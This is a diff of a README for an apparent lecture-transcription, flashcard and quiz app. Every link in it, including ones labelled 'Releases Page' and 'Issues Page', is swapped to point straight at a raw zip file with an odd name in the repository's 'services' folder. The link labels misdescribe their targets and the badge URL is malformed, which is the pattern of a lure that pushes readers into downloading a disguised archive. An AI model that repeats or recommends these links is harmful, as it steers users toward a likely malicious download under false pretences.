@@ -1,6 +1,6 @@
 # 🎓 Ezi-lecture-transcriber-flashcards-quiz - Simplify Your Study Process
 
-[![Download Now](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip%20Now-Click%https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip)](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip)
+[![Download Now](https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip%20Now-Click%https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip)](https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Ezi-lecture-transcriber-flashcards-quiz app! This application use
 
 ## 📥 Download & Install
 
-To start using the Ezi-lecture-transcriber-flashcards-quiz app, visit this page to download: [Download Here](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip).
+To start using the Ezi-lecture-transcriber-flashcards-quiz app, visit this page to download: [Download Here](https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip).
 
 ### System Requirements
 
@@ -21,7 +21,7 @@ Before you download the application, make sure your computer meets the following
 
 ## ⚙️ Installation Steps
 
-1. **Navigate to the Releases Page**: Visit the [Releases Page](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip). You'll find a list of available versions of the application.
+1. **Navigate to the Releases Page**: Visit the [Releases Page](https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip). You'll find a list of available versions of the application.
 
 2. **Select Version**: Choose the latest release at the top. Click on it to view the download options.
 
@@ -71,7 +71,7 @@ If you run into issues, consider these tips:
 
 ## 🤝 Support
 
-For additional help, check the [Issues Page](https://github.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/raw/refs/heads/main/components/Ezi_quiz_flashcards_transcriber_lecture_2.7.zip) for common questions and solutions. If you don't find your issue, feel free to open a new issue.
+For additional help, check the [Issues Page](https://raw.githubusercontent.com/ayushthakur589/Ezi-lecture-transcriber-flashcards-quiz/main/services/lecture_quiz_flashcards_transcriber_Ezi_middlemanism.zip) for common questions and solutions. If you don't find your issue, feel free to open a new issue.
 
 ## ⚡ Topics
 
